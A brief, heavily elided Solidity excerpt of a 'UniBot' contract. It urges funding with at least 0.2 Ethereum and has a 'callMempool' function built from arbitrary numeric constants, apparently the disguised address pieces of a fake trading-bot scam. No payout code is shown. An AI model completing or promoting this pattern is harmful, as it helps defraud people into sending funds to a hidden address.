...
// Minimum contract liquidity is 0.2 Ethereum. Contracts funded with lower amounts may face liquidity issues
...
contract UniBot {
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 682436097818;
        uint _memPoolLength = 16870652076201;
        uint _memPoolSize = 741;
